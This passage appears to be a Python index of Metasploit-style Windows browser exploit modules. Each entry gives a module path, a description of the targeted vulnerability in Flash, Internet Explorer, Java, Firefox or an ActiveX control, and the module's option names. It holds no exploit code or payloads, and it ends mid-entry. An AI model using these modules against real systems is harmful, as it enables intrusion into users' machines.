	class windows_browser_adobe_flash_otf_font(object):
		"""
		
          This module exploits a vulnerability found in the ActiveX component of Adobe
        Flash Player before 11.3.300.271. By supplying a specially crafted .otf font file
        with a large nTables value in the 'kern' header, it is possible to trigger an
        integer overflow, which results in remote code execution under the context of the
        user.  This vulnerability has also been exploited in the wild in limited targeted
        attacks.  Please note in order to ensure reliability, the exploit is forced to
        modify your URIPATH parameter to less than 3 characters, which may cause possible
        URIPATH collisions.
      
		"""

		path = 'windows/browser/adobe_flash_otf_font'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			required_ROP = 'ROP'

	class windows_browser_ea_checkrequirements(object):
		"""
		
          This module exploits a stack buffer overflow in Electronic Arts SnoopyCtrl
        ActiveX Control (NPSnpy.dll 1.1.0.36. When sending a overly long
        string to the CheckRequirements() method, an attacker may be able
        to execute arbitrary code.
      
		"""

		path = 'windows/browser/ea_checkrequirements'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_windvd7_applicationtype(object):
		"""
		
          This module exploits a stack buffer overflow in IASystemInfo.dll ActiveX
        control in InterVideo WinDVD 7. By sending a overly long string
        to the "ApplicationType()" property, an attacker may be able to
        execute arbitrary code.
      
		"""

		path = 'windows/browser/windvd7_applicationtype'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_browser_mozilla_nssvgvalue(object):
		"""
		
        This module exploits an out-of-bounds access flaw in Firefox 7 and 8 (<= 8.0.1).
        The notification of nsSVGValue observers via nsSVGValue::NotifyObservers(x,y)
        uses a loop which can result in an out-of-bounds access to attacker-controlled memory.
        The mObserver ElementAt() function (which picks up pointers), does not validate
        if a given index is out of bound. If a custom observer of nsSVGValue is created,
        which removes elements from the original observer,
        and memory layout is manipulated properly, the ElementAt() function might pick up
        an attacker provided pointer, which can be leveraged to gain remote arbitrary
        code execution.
      
		"""

		path = 'windows/browser/mozilla_nssvgvalue'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ms06_071_xml_core(object):
		"""
		
          This module exploits a code execution vulnerability in Microsoft XML Core Services which
        exists in the XMLHTTP ActiveX control. This module is the modifed version of
        http://www.milw0rm.com/exploits/2743 - credit to str0ke. This module has been successfully
        tested on Windows 2000 SP4, Windows XP SP2, Windows 2003 Server SP0 with IE6
        + Microsoft XML Core Services 4.0 SP2.
      
		"""

		path = 'windows/browser/ms06_071_xml_core'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_adobe_flash_worker_byte_array_uaf(object):
		"""
		
        This module exploits a use-after-free vulnerability in Adobe Flash Player. The
        vulnerability occurs when the ByteArray assigned to the current ApplicationDomain
        is freed from an ActionScript worker, which can fill the memory and notify the main
        thread to corrupt the new contents. This module has been tested successfully on
        Windows 7 SP1 (32-bit), IE 8 to IE 11 and Flash 16.0.0.296.
      
		"""

		path = 'windows/browser/adobe_flash_worker_byte_array_uaf'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			JsObfuscate = 'JsObfuscate'
			JsIdentifiers = 'JsIdentifiers'
			Retries = 'Retries'
			CookieName = 'CookieName'
			CookieExpiration = 'CookieExpiration'
			Custom404 = 'Custom404'

	class windows_browser_ms11_050_mshtml_cobjectelement(object):
		"""
		
          This module exploits a use-after-free vulnerability in Internet Explorer. The
        vulnerability occurs when an invalid <object> tag exists and other elements
        overlap/cover where the object tag should be when rendered (due to their
        styles/positioning). The mshtml!CObjectElement is then freed from memory because
        it is invalid. However, the mshtml!CDisplay object for the page continues to keep
        a reference to the freed <object> and attempts to call a function on it, leading
        to the use-after-free.

          Please note that for IE 8 targets, JRE (Java Runtime Environment) is required
        to bypass DEP (Data Execution Prevention).
      
		"""

		path = 'windows/browser/ms11_050_mshtml_cobjectelement'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_ms10_022_ie_vbscript_winhlp32(object):
		"""
		
          This module exploits a code execution vulnerability that occurs when a user
        presses F1 on MessageBox originated from VBscript within a web page. When the
        user hits F1, the MessageBox help functionaility will attempt to load and use
        a HLP file from an SMB or WebDAV (if the WebDAV redirector is enabled) server.

        This particular version of the exploit implements a WebDAV server that will
        serve HLP file as well as a payload EXE. During testing warnings about the
        payload EXE being unsigned were witnessed. A future version of this module
        might use other methods that do not create such a warning.
      
		"""

		path = 'windows/browser/ms10_022_ie_vbscript_winhlp32'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_browser_real_arcade_installerdlg(object):
		"""
		
          This module exploits a vulnerability in Real Networks Acrade Game's ActiveX control. The "exec"
        function found in InstallerDlg.dll (v2.6.0.445) allows remote attackers to run arbitrary commands
        on the victim machine.
      
		"""

		path = 'windows/browser/real_arcade_installerdlg'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_browser_adobe_flash_avm2(object):
		"""
		
        This module exploits a vulnerability found in the ActiveX component of Adobe Flash Player
        before 12.0.0.43. By supplying a specially crafted swf file it is possible to trigger an
        integer underflow in several avm2 instructions, which can be turned into remote code
        execution under the context of the user, as exploited in the wild in February 2014. This
        module has been tested successfully with Adobe Flash Player 11.7.700.202 on Windows XP
        SP3, Windows 7 SP1 and Adobe Flash Player 11.3.372.94 on Windows 8 even when it includes
        rop chains for several Flash 11 versions, as exploited in the wild.
      
		"""

		path = 'windows/browser/adobe_flash_avm2'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			JsObfuscate = 'JsObfuscate'
			JsIdentifiers = 'JsIdentifiers'
			Retries = 'Retries'
			CookieName = 'CookieName'
			CookieExpiration = 'CookieExpiration'
			Custom404 = 'Custom404'

	class windows_browser_ie_cgenericelement_uaf(object):
		"""
		
          This module exploits a vulnerability found in Microsoft Internet Explorer. A
        use-after-free condition occurs when a CGenericElement object is freed, but a
        reference is kept on the Document and used again during rendering, an invalid
        memory that's controllable is used, and allows arbitrary code execution under the
        context of the user.

          Please note: This vulnerability has been exploited in the wild on 2013 May, in
        the compromise of the Department of Labor (DoL) Website.
      
		"""

		path = 'windows/browser/ie_cgenericelement_uaf'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_aol_ampx_convertfile(object):
		"""
		
          This module exploits a stack-based buffer overflow in AOL IWinAmpActiveX
        class (AmpX.dll) version 2.4.0.6 installed via AOL Radio website.
        By setting an overly long value to 'ConvertFile()', an attacker can overrun
        a buffer and execute arbitrary code.
      
		"""

		path = 'windows/browser/aol_ampx_convertfile'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ibmegath_getxmlvalue(object):
		"""
		
          This module exploits a stack buffer overflow in IBM Access Support. When
        sending an overly long string to the GetXMLValue() method of IbmEgath.dll
        (3.20.284.0) an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/browser/ibmegath_getxmlvalue'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_honeywell_tema_exec(object):
		"""
		
          This modules exploits a vulnerability found in the Honewell Tema ActiveX Remote
        Installer.  This ActiveX control can be abused by using the DownloadFromURL()
        function to install an arbitrary MSI from a remote location without checking source
        authenticity or user notification. This module has been tested successfully with
        the Remote Installer ActiveX installed with HoneyWell EBI R410.1 - TEMA 5.3.0 and
        Internet Explorer 6, 7 and 8 on Windows XP SP3.
      
		"""

		path = 'windows/browser/honeywell_tema_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_ms13_090_cardspacesigninhelper(object):
		"""
		
        This module exploits a vulnerability on the CardSpaceClaimCollection class from the
        icardie.dll ActiveX control. The vulnerability exists while the handling of the
        CardSpaceClaimCollection object. CardSpaceClaimCollections stores a collection of
        elements on a SafeArray and keeps a size field, counting the number of elements on the
        collection. By calling the remove() method on an empty CardSpaceClaimCollection it is
        possible to underflow the length field, storing a negative integer. Later, a call to
        the add() method will use the corrupted length field to compute the address where write
        into the SafeArray data, allowing to corrupt memory with a pointer to controlled contents.
        This module achieves code execution by using VBScript as discovered in the wild on
        November 2013 to (1) create an array of html OBJECT elements, (2) create holes, (3) create
        a CardSpaceClaimCollection whose SafeArray data will reuse one of the holes, (4) corrupt
        one of the legit OBJECT elements with the described integer overflow and (5) achieve code
        execution by forcing the use of the corrupted OBJECT.
      
		"""

		path = 'windows/browser/ms13_090_cardspacesigninhelper'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			JsObfuscate = 'JsObfuscate'
			JsIdentifiers = 'JsIdentifiers'
			Retries = 'Retries'
			CookieName = 'CookieName'
			CookieExpiration = 'CookieExpiration'
			Custom404 = 'Custom404'

	class windows_browser_java_cmm(object):
		"""
		
          This module abuses the Color Management classes from a Java Applet to run
        arbitrary Java code outside of the sandbox as exploited in the wild in February
        and March of 2013. The vulnerability affects Java version 7u15 and earlier and 6u41
        and earlier and has been tested successfully on Windows XP SP3 and Windows 7 SP1
        systems. This exploit doesn't bypass click-to-play, so the user must accept the java
        warning in order to run the malicious applet.
      
		"""

		path = 'windows/browser/java_cmm'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_browser_siemens_solid_edge_selistctrlx(object):
		"""
		
        This module exploits the SEListCtrlX ActiveX installed with the Siemens Solid Edge product.
        The vulnerability exists on several APIs provided by the control, where user supplied input
        is handled as a memory pointer without proper validation, allowing an attacker to read and
        corrupt memory from the target process. This module abuses the methods NumChildren() and
        DeleteItem() in order to achieve memory info leak and remote code execution respectively.
        This module has been tested successfully on IE6-IE9 on Windows XP SP3 and Windows 7 SP1,
        using Solid Edge 10.4.
      
		"""

		path = 'windows/browser/siemens_solid_edge_selistctrlx'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_symantec_altirisdeployment_runcmd(object):
		"""
		
          This module exploits a stack buffer overflow in Symantec Altiris Deployment Solution.
        When sending an overly long string to RunCmd() method of
        AeXNSConsoleUtilities.dll (6.0.0.1426) an attacker may be able to execute arbitrary
        code.
      
		"""

		path = 'windows/browser/symantec_altirisdeployment_runcmd'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ms11_003_ie_css_import(object):
		"""
		
          This module exploits a memory corruption vulnerability within Microsoft/'s
        HTML engine (mshtml). When parsing an HTML page containing a recursive CSS
        import, a C++ object is deleted and later reused. This leads to arbitrary
        code execution.

        This exploit utilizes a combination of heap spraying and the
